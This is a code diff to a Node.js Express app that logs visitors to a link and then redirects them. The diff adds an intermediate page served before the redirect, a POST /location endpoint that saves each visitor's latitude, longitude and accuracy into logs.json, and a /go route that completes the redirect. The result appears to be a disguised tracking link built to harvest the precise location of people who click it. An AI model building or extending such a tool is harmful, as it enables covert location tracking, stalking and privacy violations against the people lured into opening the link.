@@ -6,6 +6,7 @@ const fs = require("fs");
 const app = express();
 
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json());
 
 // =========================
 // SETTINGS
@@ -87,7 +88,7 @@ app.get("/", async (req, res) => {
 
     await logVisitor(req);
 
-    res.redirect(redirectUrl);
+    res.sendFile(__dirname + "/pages/location.html");
 
 });
 
@@ -166,6 +167,37 @@ ${JSON.stringify(logs, null, 4)}
 });
 
 // =========================
+
+app.post("/location", (req, res) => {
+
+    let logs = [];
+
+    if (fs.existsSync("logs.json")) {
+        logs = JSON.parse(fs.readFileSync("logs.json", "utf8"));
+    }
+
+    if (logs.length > 0) {
+
+        logs[0].latitude = req.body.latitude;
+        logs[0].longitude = req.body.longitude;
+        logs[0].accuracy = req.body.accuracy;
+
+        fs.writeFileSync(
+            "logs.json",
+            JSON.stringify(logs, null, 2)
+        );
+    }
+
+    res.sendStatus(200);
+
+});
+
+// ADD THIS
+app.get("/go", (req, res) => {
+
+    res.redirect(redirectUrl);
+
+});
 
 const PORT = process.env.PORT || 3000;
 
